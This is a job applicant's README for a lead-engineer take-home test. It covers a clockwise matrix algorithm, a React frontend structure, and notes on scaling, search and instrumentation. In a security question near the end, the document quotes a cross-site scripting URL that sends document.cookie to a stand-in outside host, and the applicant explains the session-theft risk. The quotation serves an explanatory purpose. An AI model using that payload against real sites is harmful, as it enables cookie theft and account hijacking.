# Lead Engineer Test

Author: [Pablo Sande](mailto:psande@gmail.com)

## Setup

### Running

Open one command line tab in `backend` and one in `frontend`, as both projects run independently.

In both command line instances run:

- `yarn install`
- `yarn start`
- Open [localhost:3000](http://localhost:3000) in your browser.

### Testing

The following commands are available for testing.

Command | Description
------------ | -------------
`yarn test` | Run tests and watch for file changes
`yarn test-all` | Run all tests once
`yarn test-matrix` | Run only tests for Task 1: Clockwise Matrix

### Sitemap

The tasks and their descriptions can be found in the follow paths:

```text                                              
 /(root)                                                 
 ║                                                       
 ╠ /clockwise-matrix (Task 1)                            
 ║ ║                                                     
 ║ ╚/clockwise-matrix/assignment (Task 1 Description)    
 ║                                                       
 ╚/real-world (Task 2)                                   
  ║                                                      
  ╚ /real-world/assignment (Task 2 Description)                                                               
```

## Task 1: Clockwise Matrix

* I've decided to merge Task 1 and Task 2 into the same code base, to make it easy to develop and to review.
* If you have the project setup, you can run the Task 1 specific tests by running `yarn test-matrix` in the
  frontend folder.

### Algorithm

The algorithm is quite simple in itself. It goes as follows:

* Parse input
* Get total matrix length
* For each position of that length we calculate which element of the matrix should be outputted
* Return output

The key function (spiralAt in clockwiseMatrix.ts) works recursively by checking if the index we are looking
for is in the edges of the matrix, if not, calling itself with a sub-matrix that doesn't include these edges.

See the general algorithm path and the first call below.

```text
┌─────────────────────────────┐
│   Unwind Matrix Algorithm   │
└─────────────────────────────┘
                               
┌─────┬─────┬─────┬─────┬─────┐
│0    │1    │2    │3    │4    │
│  ○━━╋━━━━━╋━━━━━╋━━━━━╋━━┓  │
├─────┼─────┼─────┼─────┼──╋──┤
│15   │16   │17   │18   │5 ┃  │
│  ▲─ ┼ ─●━━╋━━━━━╋━━┓  │  ┃  │
├──╋──┼─────┼─────┼──╋──┼──╋──┤
│14┃  │23▲─ ┼24●━┓│19┃  │6 ┃  │
│  ┃  │  ┃  │  □━┛│  ┃  │  ┃  │
├──╋──┼──╋──┼─────┼──╋──┼──╋──┤
│13┃  │22┃  │21   │20┃  │7 ┃  │
│  ┃  │  ┗━━╋━━━━━╋━━┛  │  ┃  │
├──╋──┼─────┼─────┼─────┼──╋──┤
│12┃  │11   │10   │9    │8 ┃  │
│  ┗━━╋━━━━━╋━━━━━╋━━━━━╋━━┛  │
└─────┴─────┴─────┴─────┴─────┘
```

Calls 0-15 of spiralAt of a 5x5 matrix. The arrows represent the indexes checked in the if statements.

```text
┌─────────────────────────────┐
│ First call of a 5x5 matrix  │
└─────────────────────────────┘
                               
┌─────┬─────┬─────┬─────┬─────┐
│0    │1    │2    │3    │4    │
│  ○──┼─────┼─────┼─────┼──▶  │
├─────┼─────┼─────┼─────┼─────┤
│15   │next │     │     │5 ●  │
│  ▲─ ┼ ─●  │     │     │  │  │
├──┼──┼─────┼─────┼─────┼──┼──┤
│14│  │     │     │     │6 │  │
│  │  │     │     │     │  │  │
├──┼──┼─────┼─────┼─────┼──┼──┤
│13│  │     │     │     │7 │  │
│  ●  │     │     │     │  │  │
├─────┼─────┼─────┼─────┼──┼──┤
│12   │11   │10   │9    │8 │  │
│  ◀──┼─────┼─────┼──●  │  ▼  │
└─────┴─────┴─────┴─────┴─────┘
```

### Improvements

After doing some research online I can definitely see how this could be improved by calculating the indexes
instead of doing it recursively.

I think that for the time constraint of the exercise and for the sake of clarity, this is a good enough
implementation.

There are in place a few exceptions that need to be caught when it is called. This is for the sake of
convenience at the time of coding. The general aim is clarity more than performance.

### Time spent

I spent an afternoon during this task, included merging it into the main project and documenting it.

## Task 2: Real World App

For this task, and considering the time constraints, decided to focus more on the frontend, as I believe is
the focus of the role, and use the backend provided with the assignment.

There are comments at the top of each important file explaining what they do and what else could be in that
type of file while still respecting a clear separation of concerns.

I will explain the characteristic of the ones I've created and not go into much detail of the ones that are
standard in any React PWA application.

See below the general frontend file structure.

```text
.
├── .env
├── package.json
├── tsconfig.json
├── public
└── src
    ├── index.tsx
    ├── api
    │   └── models
    │       └── Account.tsx
    ├── app
    ├── assets
    │   └── icons
    ├── components
    │   ├── Button
    │   ├── ErrorMsg
    │   ├── Footer
    │   ├── Form
    │   ├── Header
    │   ├── Loading
    │   ├── Notifications
    │   ├── Search
    │   ├── Sidebar
    │   └── Table
    ├── config
    ├── layouts
    │   └── App
    ├── pages
    │   ├── Accounts
    │   ├── Assignments
    │   └── Matrix
    ├── routers
    │   └── App.tsx
    └── styles
        └── _utils.scss

```

### Frontend

Artifact | Description
----------- | -------------
.env | Environment specific settings. We could have several of them (ie: .env.prod) and use them with [env-cmd](https://www.npmjs.com/package/env-cmd)
api | Contains models for each rest resource (ie: /accounts) made with [feathers.js](https://www.npmjs.com/package/@feathersjs/rest-client) and the typescript interfaces for such models.
app | App-wide settings and initializations, including global stylesheets, configurations or redux stores.It allows us to have different apps for different webpack entry points if needed.
assets | Static files that can be imported in JS or CSS with import or @import.
icons | Similar to assets but for icons. The limitation is that they must be small enough to go below the webpack threshold that embed them in the final .js file. Specially useful for svg icons, as it allows to change colors with CSS.
components | Reusable components. They must not contain main business logic, make api calls or be connected to a global state. A `modules` folder could be created for components that have those characteristics.
config | Extensible configuration. Combines settings, .env configurations and whatever is fed in the App initialization. Must be locked to avoid changes at runtime.
layouts | Wraps pages with common UI elements. It implements react-router Route so it can be used directly in the router for better clarity. There could be different layouts based on authentication or user roles.
pages | Pages are at the core of the app, as there are one per route. I limit all the api calls and core business logic to page components. The SCSS files in App are exclusively used for organising the different components in the page and not for general styling.
router | Here we match paths with its pages and their corresponding layouts.
styles | General styles and scss utilities. Kept it simple for this exercise, but we could define colours, fonts and themes in here.

### Backend

Left as received, with minimal changes to make it work with the frontend. If I had more time with the test, I
would have implemented the REST Api using [feathers.js](https://www.npmjs.com/package/@feathersjs/feathers).

## Task 2: Extras

### Extra 1: Improved User Experience and front-end design

Instead of making the user navigate to a new page to edit the basic fields of an account, I've implemented a
sidebar that allows in-place editing. For this exercise that means the all the field, but could also contain a
link to a page with all the user details.

I've put emphasis on the type of actions of the user. Blue for selecting/editing, green for new, red for
deletion. This is to highlight how these actions are tied together in the code.

For example: The delete button is red, and so is its notification. The focus is the frontend more than
sticking to common design patterns.

### Extra 2: Full service implementation

I've decided to not implement this, as I understanding the focus of the role is more on the frontend side.

That being said, creating a backend with feathers.js (based on express.js), or pure Express, for a single
endpoint is quite easy, and I can do it if the reviewer requests it.

Instead, I spent the limited time creating a frontend that is closer to a production app, included thorough
testing and better design.

I will answer the questions anyway.

##### What considerations did you make for adding this additional data?

I would have implemented this using SQLite for portability (ie: sending it to you). I would have followed all
the common practices in SQL databases, such as well defined schemas, user input validations, correct index
settings for querying, including full-text searches.

#### How would you scale this system to millions of accounts?

Having multiple web servers increase the load on the database layer, and it can become a bottleneck if not
planned accordingly.

To circumvent this, we have 2 options:

1. Split read and writes into separate services so user read operations don't affect writes which are usually
   heavier and more time-consuming.
2. Partition and shard the database so multiple machines take care of smaller chunks of data as opposed to one
   database server taking care of everything and becoming a bottleneck.

Additionally, some write operations can be moved into fully asynchronous way by using Messaging Layer in an
event-driven architecture. With this approach, non-critical operations don't consume resources that can be
allocated for critical operation. Moreover, these can scale out by adding more workers that listen to the
queue to increase throughput.

### Extra 3: Add searching/filtering functionality to the accounts.

For this exercise I've implemented filtering in the table itself, as I'm fetching all the accounts at once.
This wouldn't scale well, for obvious reasons.

#### How would this search scale if there were a million accounts?

On the frontend, all the UI element wouldn't operate locally, and they would fetch data when interacted with.
Ie: Pagination or filtering. In the UI elements where onChange events are used (ie: search as you type),
debounced functions should be used. These are all common practices for high scale websites, to avoid
unnecessary stress on the backend.

On the backend, to ensure the application search can cope with high load and scales, I'd introduce a search
engine to index content from the database and is used for web searches. Search engines can scale by adding
more nodes to clusters. Data and queries are distributed between available nodes.

See below a diagram for a possible architecture.

```text                                                     
                             ┌─────────────────────┐        ┌─────────────────────┐          
                             │                     │        │                     │          
                             │       Client        │───────▶│         CDN         │          
                             │                     │        │                     │          
                             └─────────────────────┘        └─────────────────────┘          
                                        │                                                    
                                        │                                                    
                                        │                                                    
                              ┌─────────▼───────────┐                                        
                             ┌┴────────────────────┐│                                        
                            ┌┴────────────────────┐││                                        
                            │                     │││                                        
                            │    Load Balancer    │├┘                                        
                            │                     ├┘                                         
                            └───────────┬─────────┘                                          
                                        │                                                    
                                        │                                                    
                              ┌─────────▼───────────┐                                        
                             ┌┴────────────────────┐│                                        
                            ┌┴────────────────────┐││                                        
                            │                     │││                                        
                            │     Web Server      │├┘                                        
                            │                     ├┘                                         
                            └───────┬───┬───┬─────┘                                          
                                    │   │   │                                                
                                    │   │   │                                                
            ┌───────────────────────┘   │   └─────────────────────────┐                      
            │                           │                             │                      
            │                           │                             │                      
  ┌─────────▼───────────┐     ┌─────────▼───────────┐       ┌─────────▼───────────┐          
 ┌┴────────────────────┐│    ┌┴────────────────────┐│      ┌┴────────────────────┐│          
┌┴────────────────────┐││   ┌┴────────────────────┐││     ┌┴────────────────────┐││          
│   Write Endpoint    │││   │                     │││     │        Read         │││          
│        Async        │├┘   │   Write Endpoint    │├┘  ┌──┤      Endpoint       │├┘          
│                     ├┘    │                     ├┘   │  │                     ├┘           
└───────────┬─────────┘     └───────────┬─────────┘    │  └────┬────────────────┘│           
            │                           │              │       │                 │           
            │                           │              │       │                 │           
  ┌─────────▼───────────┐               │              │       │                 │           
 ┌┴────────────────────┐│               │              │       │                 │           
┌┴────────────────────┐││               │              │       │      ┌──────────▼──────────┐
│                     │││               │              │       │     ┌┴────────────────────┐│
│        Queue        │├┘               │              │       │    ┌┴────────────────────┐││
│                     ├┘                │              │       │    │                     │││
└───────────┬─────────┘             .───▼───────.      │       │    │    Memory Cache     │├┘
            │                     .───────────.  )     │       │    │                     ├┘ 
            │                    (             )'│     │       │    └─────────────────────┘  
  ┌─────────▼───────────┐        │`───────────'│ │     │       │                             
 ┌┴────────────────────┐│        │             │ ◀─────┘       │                             
┌┴────────────────────┐││        │ Database    │ │         ┌───▼─────────────────┐           
│                     ││├────────▶   Shards    │ │         │                     │           
│       Workers       │├┘        │             │ ◀ ─ ─ ─ ─ ┤    Search Engine    │           
│                     ├┘         │             ├─┘         │                     │           
└─────────────────────┘          └─────────────┘           └─────────────────────┘           
```

#### What considerations did you make for performance?

There are all sort of performance improvements on every layer of a search request that can be made. I will
name few of them.

- **Frontend**: Avoid unnecessary requests, debounced events, client-side validations, client-side caching.
- **Backend**: Stateless functions (ie: AWS Lambda vs monolithic), choosing versions of servers that boot up
  faster (deno vs node).
- **Database**: Choosing the right DB for the use-case (SQL vs Artifacts and vendor-specific features),
  in-memory caching, sharding, federation, clusters.
- **Infrastructure**: Message layers, better hardware (ram vs cpu vs storage), auto-scaling, load balancers.

### Extra 4: Implement performance instrumentation for your application.

#### Which parts of the app did you instrument and why did you consider those areas?

For the frontend I would have implemented this using the new standard [WebVitals](https://web.dev/vitals/). It
defines important metrics such as the first rendering of a page and the time of when the page is made
interactive.

On top of that, I would define custom metrics, specially in tasks that can be CPU intensive or make api calls.

On the backend I would measure the time consumed in the different stages of a request made by the user.

- Fetching data from a DB
- Accessing files in disk
- Processing large batches of data
- External dependencies such as API's
- Memory usage (to detect memory leaks)

#### Describe how the instrumentation you added could be used by QA

There are tools, such as [Sentry](https://sentry.io/), that allows you to gather this information and define
thresholds of acceptable performance, logs and environment information, that could be used by QA and the
development teams to identify where the problems are happening.

### How much time did you spend on the main task?

All included, that is, coding, testing and documenting, I probably spent 4 full 8-hours days.

## Question 1: What harm could result from the following?

```
http://www.example.com/search?q=\<script\>object.src="http://otherexample.com/code?data="+document.cookie\</script>
```

Your answer:

It could inject a script in the page that seems to send all your cookies to another (malicious) site. They
could store such cookies and use them to authenticate in the origin website as the user.

## Question 2: Explain what security measures need to be taken into consideration for web applications

Your answer:

Security measures are continuously evolving, and research with the latest security techniques is encourage
when tackling down security.

There are hundreds of considerations that could be made, in all the layers of an application.

Just to name a few:

- User input validation and sanitization
- Password salting and hashing in the DB
    - Encrypting critical information
- Limit requests per IP
- Correctly setup web server, included users and groups
- SSL Certificates
- Correct http headers
- Traceability in code pipelines and deployments
- Penetration tests by third parties
- Peer-review design of critical system components
- External periodic backups for recovery


